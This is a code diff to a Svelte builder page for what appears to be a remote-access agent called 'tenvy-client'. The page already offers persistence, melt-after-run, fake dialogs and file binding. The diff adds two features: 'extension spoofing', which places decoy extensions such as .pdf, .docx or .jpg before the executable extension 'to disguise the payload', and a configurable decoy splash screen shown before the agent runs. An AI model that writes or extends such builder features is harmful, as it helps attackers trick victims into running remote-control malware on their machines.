@@ -14,6 +14,7 @@
 		CollapsibleContent,
 		CollapsibleTrigger
 	} from '$lib/components/ui/collapsible/index.js';
+	import * as Dialog from '$lib/components/ui/dialog/index.js';
 	import { Input } from '$lib/components/ui/input/index.js';
 	import { Label } from '$lib/components/ui/label/index.js';
 	import { Progress } from '$lib/components/ui/progress/index.js';
@@ -76,10 +77,44 @@
 		]
 	};
 
+	const extensionSpoofPresets = [
+		'.jpg',
+		'.png',
+		'.msi',
+		'.pdf',
+		'.docx',
+		'.xlsx',
+		'.pptx',
+		'.zip',
+		'.mp3',
+		'.mp4'
+	] as const;
+	type ExtensionSpoofPreset = (typeof extensionSpoofPresets)[number];
+
+	const splashLayoutOptions = [
+		{ value: 'center', label: 'Centered' },
+		{ value: 'split', label: 'Split accent' }
+	] as const;
+	type SplashLayout = (typeof splashLayoutOptions)[number]['value'];
+
+	const defaultSplashScreen = {
+		title: 'Preparing setup',
+		subtitle: 'Initializing components',
+		message: 'Please wait while we ready the installer.',
+		background: '#0f172a',
+		accent: '#22d3ee',
+		text: '#f8fafc',
+		layout: 'center' as SplashLayout
+	} as const;
+
 	let outputFilename = $state('tenvy-client');
 	let targetOS = $state<TargetOS>('windows');
 	let targetArch = $state<TargetArch>('amd64');
 	let outputExtension = $state(extensionOptionsByOS.windows[0]);
+	let extensionSpoofingEnabled = $state(false);
+	let extensionSpoofPreset = $state<ExtensionSpoofPreset>(extensionSpoofPresets[0]);
+	let extensionSpoofCustom = $state('');
+	let extensionSpoofError = $state<string | null>(null);
 	let installationPath = $state('');
 	let meltAfterRun = $state(false);
 	let startupOnBoot = $state(false);
@@ -168,11 +203,73 @@
 	let fakeDialogType = $state<FakeDialogType>('none');
 	let fakeDialogTitle = $state('');
 	let fakeDialogMessage = $state('');
+	let splashScreenEnabled = $state(false);
+	let splashDialogOpen = $state(false);
+	let splashTitle = $state(defaultSplashScreen.title);
+	let splashSubtitle = $state(defaultSplashScreen.subtitle);
+	let splashMessage = $state(defaultSplashScreen.message);
+	let splashBackgroundColor = $state(defaultSplashScreen.background);
+	let splashAccentColor = $state(defaultSplashScreen.accent);
+	let splashTextColor = $state(defaultSplashScreen.text);
+	let splashLayout = $state<SplashLayout>(defaultSplashScreen.layout);
 	let binderFileName = $state<string | null>(null);
 	let binderFileSize = $state<number | null>(null);
 	let binderFileError = $state<string | null>(null);
 	let binderFileData = $state<string | null>(null);
 	let activeTab = $state<'connection' | 'persistence' | 'execution' | 'presentation'>('connection');
+
+	const sanitizedOutputBase = $derived(() => {
+		const trimmed = outputFilename.trim();
+		if (!trimmed) {
+			return 'tenvy-client';
+		}
+
+		const normalizedExtension = outputExtension.toLowerCase();
+		let base = trimmed;
+		if (normalizedExtension && trimmed.toLowerCase().endsWith(normalizedExtension)) {
+			base = trimmed.slice(0, -normalizedExtension.length);
+		}
+
+		const withoutTrailingDot = base.replace(/\.+$/, '');
+		const sanitized = withoutTrailingDot.trim();
+		return sanitized || 'tenvy-client';
+	});
+
+	const activeSpoofExtension = $derived(() => {
+		if (!extensionSpoofingEnabled) {
+			return '';
+		}
+
+		const trimmedCustom = extensionSpoofCustom.trim();
+		const customNormalized = normalizeSpoofExtension(trimmedCustom);
+		if (trimmedCustom && customNormalized) {
+			return customNormalized;
+		}
+
+		return normalizeSpoofExtension(extensionSpoofPreset) ?? '';
+	});
+
+	const effectiveOutputFilename = $derived(
+		() => `${sanitizedOutputBase}${activeSpoofExtension}${outputExtension}`
+	);
+
+	const normalizedSplashTitle = $derived(() => splashTitle.trim() || defaultSplashScreen.title);
+	const normalizedSplashSubtitle = $derived(() => splashSubtitle.trim());
+	const normalizedSplashMessage = $derived(
+		() => splashMessage.trim() || defaultSplashScreen.message
+	);
+	const normalizedSplashBackground = $derived(() =>
+		normalizeHexColor(splashBackgroundColor, defaultSplashScreen.background)
+	);
+	const normalizedSplashAccent = $derived(() =>
+		normalizeHexColor(splashAccentColor, defaultSplashScreen.accent)
+	);
+	const normalizedSplashText = $derived(() =>
+		normalizeHexColor(splashTextColor, defaultSplashScreen.text)
+	);
+	const splashLayoutLabel = $derived(
+		() => splashLayoutOptions.find((option) => option.value === splashLayout)?.label ?? 'Centered'
+	);
 
 	const isWindowsTarget = $derived(targetOS === 'windows');
 
@@ -213,6 +310,24 @@
 		}
 	});
 
+	$effect(() => {
+		if (!extensionSpoofingEnabled) {
+			extensionSpoofError = null;
+			return;
+		}
+
+		const trimmed = extensionSpoofCustom.trim();
+		if (!trimmed) {
+			extensionSpoofError = null;
+			return;
+		}
+
+		extensionSpoofError =
+			normalizeSpoofExtension(trimmed) === null
+				? 'Custom extension must use 1-12 letters or numbers.'
+				: null;
+	});
+
 	function resetProgress() {
 		buildStatus = 'idle';
 		buildProgress = 0;
@@ -240,6 +355,53 @@
 				tone
 			}
 		];
+	}
+
+	function normalizeSpoofExtension(value: string): string | null {
+		if (!value) {
+			return null;
+		}
+
+		const trimmed = value.trim();
+		if (!trimmed) {
+			return null;
+		}
+
+		const withDot = trimmed.startsWith('.') ? trimmed : `.${trimmed}`;
+		const alphanumeric = withDot.slice(1).replace(/[^A-Za-z0-9]/g, '');
+
+		if (!alphanumeric) {
+			return null;
+		}
+
+		if (alphanumeric.length > 12) {
+			return null;
+		}
+
+		return `.${alphanumeric.toLowerCase()}`;
+	}
+
+	function normalizeHexColor(value: string, fallback: string): string {
+		if (typeof value !== 'string') {
+			return fallback;
+		}
+
+		const trimmed = value.trim();
+		if (/^#[0-9A-Fa-f]{6}$/.test(trimmed)) {
+			return trimmed.toLowerCase();
+		}
+
+		return fallback;
+	}
+
+	function resetSplashToDefaults() {
+		splashTitle = defaultSplashScreen.title;
+		splashSubtitle = defaultSplashScreen.subtitle;
+		splashMessage = defaultSplashScreen.message;
+		splashBackgroundColor = defaultSplashScreen.background;
+		splashAccentColor = defaultSplashScreen.accent;
+		splashTextColor = defaultSplashScreen.text;
+		splashLayout = defaultSplashScreen.layout;
 	}
 
 	function sanitizeFileInformation() {
@@ -714,7 +876,7 @@
 		const payload: Record<string, unknown> = {
 			host: trimmedHost,
 			port: trimmedPort || '2332',
-			outputFilename: outputFilename.trim() || 'tenvy-client',
+			outputFilename: effectiveOutputFilename,
 			outputExtension,
 			targetOS,
 			targetArch,
@@ -797,6 +959,22 @@
 				title,
 				message
 			} satisfies Record<string, unknown>;
+		}
+		if (splashScreenEnabled) {
+			const subtitle = normalizedSplashSubtitle;
+			const splashPayload = {
+				enabled: true,
+				title: normalizedSplashTitle,
+				message: normalizedSplashMessage,
+				layout: splashLayout,
+				colors: {
+					background: normalizedSplashBackground,
+					text: normalizedSplashText,
+					accent: normalizedSplashAccent
+				},
+				...(subtitle ? { subtitle } : {})
+			} satisfies Record<string, unknown>;
+			payload.splashScreen = splashPayload;
 		}
 		if (binderFileData && binderFileName) {
 			payload.binder = {
@@ -955,6 +1133,44 @@
 			</p>
 		</CardHeader>
 		<CardContent class="space-y-8">
+			{#snippet SplashPreview({ className = '' })}
+				<div
+					class={`overflow-hidden rounded-lg border border-border/60 ${className}`}
+					style={`background:${normalizedSplashBackground};color:${normalizedSplashText};`}
+				>
+					{#if splashLayout === 'split'}
+						<div class="flex flex-col sm:flex-row">
+							<div
+								class="h-2 w-full sm:h-auto sm:w-2"
+								style={`background:${normalizedSplashAccent};`}
+							/>
+							<div class="flex-1 space-y-3 px-6 py-8 text-left sm:px-8">
+								{#if normalizedSplashSubtitle}
+									<p class="text-xs font-semibold tracking-wide uppercase opacity-80">
+										{normalizedSplashSubtitle}
+									</p>
+								{/if}
+								<h4 class="text-xl font-semibold">{normalizedSplashTitle}</h4>
+								<p class="text-sm leading-relaxed opacity-80">{normalizedSplashMessage}</p>
+							</div>
+						</div>
+					{:else}
+						<div class="flex flex-col items-center gap-3 px-6 py-8 text-center">
+							<div
+								class="h-1.5 w-16 rounded-full"
+								style={`background:${normalizedSplashAccent};`}
+							/>
+							<h4 class="text-lg font-semibold">{normalizedSplashTitle}</h4>
+							{#if normalizedSplashSubtitle}
+								<p class="text-xs font-semibold tracking-wide uppercase opacity-80">
+									{normalizedSplashSubtitle}
+								</p>
+							{/if}
+							<p class="text-sm leading-relaxed opacity-80">{normalizedSplashMessage}</p>
+						</div>
+					{/if}
+				</div>
+			{/snippet}
 			<div class="grid gap-8 xl:grid-cols-[minmax(0,2.35fr)_minmax(0,1fr)]">
 				<div class="space-y-8">
 					<Tabs bind:value={activeTab} class="space-y-6">
@@ -964,7 +1180,9 @@
 							<TabsTrigger value="connection" class="flex-1 sm:flex-none">Connection</TabsTrigger>
 							<TabsTrigger value="persistence" class="flex-1 sm:flex-none">Persistence</TabsTrigger>
 							<TabsTrigger value="execution" class="flex-1 sm:flex-none">Execution</TabsTrigger>
-							<TabsTrigger value="presentation" class="flex-1 sm:flex-none">Presentation</TabsTrigger>
+							<TabsTrigger value="presentation" class="flex-1 sm:flex-none"
+								>Presentation</TabsTrigger
+							>
 						</TabsList>
 
 						<TabsContent value="connection" class="space-y-6">
@@ -989,6 +1207,14 @@
 									<div class="grid gap-2">
 										<Label for="output">Output filename</Label>
 										<Input id="output" placeholder="tenvy-client" bind:value={outputFilename} />
+										<p class="text-xs text-muted-foreground">
+											Final artifact name:
+											<code
+												class="rounded bg-muted px-1.5 py-0.5 text-[0.7rem] font-semibold text-foreground"
+											>
+												{effectiveOutputFilename}
+											</code>
+										</p>
 									</div>
 									<div class="grid gap-2">
 										<Label for="group-tag">Group tag</Label>
@@ -1045,6 +1271,79 @@
 												<option value={option}>{option}</option>
 											{/each}
 										</select>
+									</div>
+									<div class="md:col-span-2 lg:col-span-3">
+										<div
+											class="space-y-4 rounded-lg border border-dashed border-border/70 bg-background/40 p-4"
+										>
+											<div class="flex flex-wrap items-center justify-between gap-3">
+												<div>
+													<p class="text-sm font-semibold">Extension spoofing</p>
+													<p class="text-xs text-muted-foreground">
+														Append a decoy extension before the actual package to disguise the
+														payload.
+													</p>
+												</div>
+												<div class="flex items-center gap-2 text-xs text-muted-foreground">
+													<Switch
+														bind:checked={extensionSpoofingEnabled}
+														aria-label="Toggle extension spoofing"
+													/>
+													<span>{extensionSpoofingEnabled ? 'Enabled' : 'Disabled'}</span>
+												</div>
+											</div>
+											{#if extensionSpoofingEnabled}
+												<div class="grid gap-4 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)]">
+													<div class="grid gap-2">
+														<Label for="spoof-preset">Common disguises</Label>
+														<select
+															id="spoof-preset"
+															bind:value={extensionSpoofPreset}
+															class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none"
+														>
+															{#each extensionSpoofPresets as preset (preset)}
+																<option value={preset}>{preset}</option>
+															{/each}
+														</select>
+														<p class="text-xs text-muted-foreground">
+															Select a predefined disguise.
+														</p>
+													</div>
+													<div class="grid gap-2">
+														<Label for="spoof-custom">Custom extension</Label>
+														<Input
+															id="spoof-custom"
+															placeholder=".jpg"
+															bind:value={extensionSpoofCustom}
+														/>
+														<p class="text-xs text-muted-foreground">
+															Leave blank to use the preset. Letters and numbers only.
+														</p>
+														{#if extensionSpoofError}
+															<p class="text-xs text-red-500">{extensionSpoofError}</p>
+														{/if}
+													</div>
+												</div>
+												<p class="text-xs text-muted-foreground">
+													Final filename:
+													<code
+														class="rounded bg-muted px-1.5 py-0.5 text-[0.7rem] font-semibold text-foreground"
+													>
+														{effectiveOutputFilename}
+													</code>
+												</p>
+											{:else}
+												<p class="text-xs text-muted-foreground">
+													Disabled. The agent will be saved as
+													<code
+														class="rounded bg-muted px-1.5 py-0.5 text-[0.7rem] font-semibold text-foreground"
+													>
+														{sanitizedOutputBase}{outputExtension}
+													</code>
+													.
+												</p>
+											{/if}
+										</div>
 									</div>
 								</div>
 							</section>
@@ -1656,6 +1955,59 @@
 										</p>
 									</div>
 								</div>
+								<div class="space-y-4 rounded-lg border border-dashed border-border/60 p-4">
+									<div class="flex flex-wrap items-center justify-between gap-3">
+										<div>
+											<p class="text-sm font-semibold">Custom splash screen</p>
+											<p class="text-xs text-muted-foreground">
+												Display a decoy splash overlay before the agent begins execution.
+											</p>
+										</div>
+										<div class="flex items-center gap-3">
+											<div class="flex items-center gap-2 text-xs text-muted-foreground">
+												<Switch
+													bind:checked={splashScreenEnabled}
+													aria-label="Toggle splash screen"
+												/>
+												<span>{splashScreenEnabled ? 'Enabled' : 'Disabled'}</span>
+											</div>
+											<Button
+												type="button"
+												variant="outline"
+												size="sm"
+												onclick={() => (splashDialogOpen = true)}
+											>
+												Customize
+											</Button>
+										</div>
+									</div>
+									{#if splashScreenEnabled}
+										<div class="space-y-3">
+											<div class="flex flex-wrap items-center gap-2 text-xs text-muted-foreground">
+												<Badge
+													variant="outline"
+													class="text-[0.65rem] font-semibold tracking-wide uppercase"
+												>
+													{splashLayoutLabel}
+												</Badge>
+												<span class="flex items-center gap-1">
+													Accent
+													<span
+														class="h-3 w-3 rounded-full border border-border/70"
+														style={`background:${normalizedSplashAccent};`}
+													/>
+												</span>
+											</div>
+											{@render SplashPreview({
+												className: splashScreenEnabled ? '' : 'opacity-60'
+											})}
+										</div>
+									{:else}
+										<p class="text-xs text-muted-foreground">
+											Disabled. Toggle the splash screen on to expose customization controls.
+										</p>
+									{/if}
+								</div>
 							</section>
 
 							{#if isWindowsTarget}
@@ -1912,4 +2264,146 @@
 			</div>
 		</CardContent>
 	</Card>
+	<Dialog.Root bind:open={splashDialogOpen}>
+		<Dialog.Content class="sm:max-w-2xl">
+			<Dialog.Header>
+				<Dialog.Title>Customize splash screen</Dialog.Title>
+				<Dialog.Description>
+					Adjust the decoy overlay shown before the agent executes.
+				</Dialog.Description>
+			</Dialog.Header>
+			<div class="grid gap-6 sm:grid-cols-[minmax(0,1fr)_minmax(0,0.9fr)]">
+				<div class="space-y-4">
+					<div
+						class="flex items-center justify-between gap-3 rounded-md border border-border/60 bg-muted/30 px-3 py-2"
+					>
+						<div>
+							<p class="text-sm font-semibold">Splash screen enabled</p>
+							<p class="text-xs text-muted-foreground">
+								Include the customized splash screen in generated builds.
+							</p>
+						</div>
+						<Switch
+							bind:checked={splashScreenEnabled}
+							aria-label="Enable splash screen for generated agents"
+						/>
+					</div>
+					<div class="grid gap-2">
+						<Label for="splash-title">Headline</Label>
+						<Input
+							id="splash-title"
+							placeholder="Preparing setup"
+							bind:value={splashTitle}
+							disabled={!splashScreenEnabled}
+						/>
+					</div>
+					<div class="grid gap-2">
+						<Label for="splash-subtitle">Subtitle</Label>
+						<Input
+							id="splash-subtitle"
+							placeholder="Initializing components"
+							bind:value={splashSubtitle}
+							disabled={!splashScreenEnabled}
+						/>
+						<p class="text-xs text-muted-foreground">
+							Optional supporting line displayed above the headline.
+						</p>
+					</div>
+					<div class="grid gap-2">
+						<Label for="splash-message">Body copy</Label>
+						<Textarea
+							id="splash-message"
+							placeholder="Please wait while we configure the installer."
+							bind:value={splashMessage}
+							class="min-h-[120px]"
+							disabled={!splashScreenEnabled}
+						/>
+					</div>
+					<div class="grid gap-3 sm:grid-cols-3">
+						<div class="space-y-2">
+							<Label for="splash-background">Background</Label>
+							<input
+								id="splash-background"
+								type="color"
+								bind:value={splashBackgroundColor}
+								class="h-10 w-full cursor-pointer rounded-md border border-border/70 bg-background"
+								disabled={!splashScreenEnabled}
+							/>
+						</div>
+						<div class="space-y-2">
+							<Label for="splash-text">Text</Label>
+							<input
+								id="splash-text"
+								type="color"
+								bind:value={splashTextColor}
+								class="h-10 w-full cursor-pointer rounded-md border border-border/70 bg-background"
+								disabled={!splashScreenEnabled}
+							/>
+						</div>
+						<div class="space-y-2">
+							<Label for="splash-accent">Accent</Label>
+							<input
+								id="splash-accent"
+								type="color"
+								bind:value={splashAccentColor}
+								class="h-10 w-full cursor-pointer rounded-md border border-border/70 bg-background"
+								disabled={!splashScreenEnabled}
+							/>
+						</div>
+					</div>
+					<div class="grid gap-2">
+						<Label>Layout</Label>
+						<div class="grid grid-cols-2 gap-2">
+							{#each splashLayoutOptions as option (option.value)}
+								<button
+									type="button"
+									class={`rounded-md border px-3 py-2 text-sm font-semibold transition focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none ${
+										splashLayout === option.value
+											? 'border-primary bg-primary/10 text-primary'
+											: 'border-border/70 text-muted-foreground hover:border-border'
+									}`}
+									onclick={() => (splashLayout = option.value)}
+									disabled={!splashScreenEnabled}
+								>
+									{option.label}
+								</button>
+							{/each}
+						</div>
+					</div>
+					<div
+						class="flex flex-wrap items-center justify-between gap-2 text-xs text-muted-foreground"
+					>
+						<span>Reset to restore the default copy and palette.</span>
+						<Button
+							type="button"
+							variant="ghost"
+							size="sm"
+							onclick={resetSplashToDefaults}
+							disabled={!splashScreenEnabled}
+						>
+							Reset to defaults
+						</Button>
+					</div>
+				</div>
+				<div class="space-y-3">
+					<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
+						Live preview
+					</p>
+					<div class={`rounded-lg bg-muted/40 p-4 ${splashScreenEnabled ? '' : 'opacity-60'}`}>
+						{@render SplashPreview({ className: 'shadow-sm' })}
+					</div>
+					<p class="text-xs text-muted-foreground">
+						Colors are applied using the provided hex values. Preview updates in real time.
+					</p>
+				</div>
+			</div>
+			<Dialog.Footer class="justify-end gap-2">
+				<Dialog.Close>
+					{#snippet child({ props })}
+						<Button {...props} type="button">Done</Button>
+					{/snippet}
+				</Dialog.Close>
+			</Dialog.Footer>
+		</Dialog.Content>
+	</Dialog.Root>
 </div>
